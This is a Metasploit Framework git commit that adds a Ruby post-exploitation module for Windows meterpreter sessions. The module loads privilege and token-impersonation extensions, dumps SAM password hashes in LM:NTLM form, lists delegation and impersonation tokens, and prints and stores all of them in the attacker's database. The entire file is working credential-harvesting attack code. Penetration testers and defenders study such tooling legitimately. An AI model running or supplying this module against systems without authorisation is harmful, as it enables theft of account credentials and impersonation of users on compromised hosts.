5b8c2007c85659c35116c5f6f2430ddb9a89b9ba
Carlos Perez <carlos_perez@darkoperator.com>
2011-03-20 17:42:37 +0000

    Migration of credcollector script to credential_collector post module
    git-svn-id: file:///home/svn/framework3/trunk@12036 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/post/windows/gather/credential_collector.rb
@@ -0,0 +1,90 @@
+##
+# $Id$
+##
+
+##
+# ## This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'rex'
+require 'msf/core/post/common'
+
+
+class Metasploit3 < Msf::Post
+
+	include Msf::Post::Common
+	include Msf::Auxiliary::Report
+
+	def initialize(info={})
+		super( update_info( info,
+				'Name'          => 'Credential Collector',
+				'Description'   => %q{ This module harvest credentials found on the host and store them in the database.},
+				'License'       => MSF_LICENSE,
+				'Author'        => [ 'tebo[at]attackresearch.com'],
+				'Version'       => '$Revision$',
+				'Platform'      => [ 'windows' ],
+				'SessionTypes'  => [ 'meterpreter']
+			))
+		
+	end
+
+	# Run Method for when run command is issued
+	def run
+		print_status("Running module against #{sysinfo['Computer']}")
+		# Collect even without a database to store them.
+		if session.framework.db.active
+			db_ok = true
+		else
+			db_ok = false
+		end
+
+
+		# Make sure we're rockin Priv and Incognito
+		session.core.use("priv") if not session.respond_to?("priv")
+		session.core.use("incognito") if not session.respond_to?("incognito")
+
+		# It wasn't me mom! Stinko did it!
+		hashes = client.priv.sam_hashes
+
+		# Target infos for the db record
+		addr = client.sock.peerhost
+		# client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
+
+		# Record hashes to the running db instance
+		print_good "Collecting hashes..."
+		hashes.each do |hash|
+			data = {}
+			data[:host]  = addr
+			data[:port]  = 445
+			data[:sname] = 'smb'
+			data[:user]  = hash.user_name
+			data[:pass]  = hash.lanman + ":" + hash.ntlm
+			data[:type]  = "smb_hash"
+			data[:active] = true
+
+			print_line "    Extracted: #{data[:user]}:#{data[:pass]}"
+			report_auth_info(data) if db_ok
+		end
+
+		# Record user tokens
+		tokens = session.incognito.incognito_list_tokens(0)
+		raise Rex::Script::Completed if not tokens
+
+		# Meh, tokens come to us as a formatted string
+		print_good "Collecting tokens..."
+		(tokens["delegation"] + tokens["impersonation"]).split("\n").each do |token|
+			data = {}
+			data[:host]      = addr
+			data[:type]      = 'smb_token'
+			data[:data]      = token
+			data[:update]    = :unique_data
+
+			print_line "    #{data[:data]}"
+			report_note(data) if db_ok
+		end
+	end
+end
